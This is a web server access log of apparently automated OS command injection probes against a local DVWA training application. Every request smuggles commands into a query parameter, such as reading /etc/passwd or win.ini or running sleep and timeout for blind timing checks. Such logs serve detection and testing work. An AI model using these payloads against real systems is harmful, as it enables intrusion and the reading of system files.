172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 624 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%26timeout+%2FT+15 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 301 636 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 301 624 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%26timeout+%2FT+15 HTTP/1.1" 301 586 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 301 586 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 301 604 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 301 592 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%3Bget-help HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 301 602 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 301 596 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%3Bget-help HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%27%3Bget-help HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%3Bget-help HTTP/1.1" 301 572 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%3Bget-help+%23 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%22%3Bget-help HTTP/1.1" 301 578 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%27%3Bget-help HTTP/1.1" 301 578 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/js?query=query%3Bget-help+%23 HTTP/1.1" 301 580 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:38 +0000] "GET /dvwa/images/spanner.png?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/images/spanner.png?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 301 590 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 301 596 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 301 600 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 301 598 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%26sleep+15%26 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%3Bsleep+15%3B HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%26sleep+15%26 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%3Bsleep+15%3B HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%26timeout+%2FT+15 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%26timeout+%2FT+15 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%3Bget-help HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%3Bget-help HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%27%3Bget-help HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%3Bget-help HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%3Bget-help HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%3Bget-help+%23 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%27%3Bget-help HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%3Bget-help+%23 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/add_event_listeners.js?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:39 +0000] "GET /dvwa/js/dvwaPage.js?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 200 1315 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
